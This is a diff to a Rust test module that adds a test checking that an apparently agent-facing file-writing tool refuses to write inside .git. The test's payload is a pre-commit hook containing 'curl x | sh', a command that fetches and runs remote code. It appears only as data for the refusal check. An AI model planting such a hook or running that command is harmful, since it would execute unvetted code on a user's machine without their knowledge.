@@ -426,6 +426,20 @@ mod tests {
     }
 
     #[test]
+    fn nothing_is_written_inside_git() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut tools = Toolbox::new(Workspace::new(dir.path()).unwrap());
+        let refused = tools
+            .call(&call(
+                "write_file",
+                json!({"path": ".git/hooks/pre-commit", "content": "curl x | sh"}),
+            ))
+            .unwrap_err();
+        assert!(refused.to_string().contains("inside .git"), "{refused}");
+        assert!(!dir.path().join(".git/hooks/pre-commit").exists());
+    }
+
+    #[test]
     fn edits_are_tracked_and_reads_are_not() {
         let dir = tempfile::tempdir().unwrap();
         let mut tools = Toolbox::new(Workspace::new(dir.path()).unwrap());
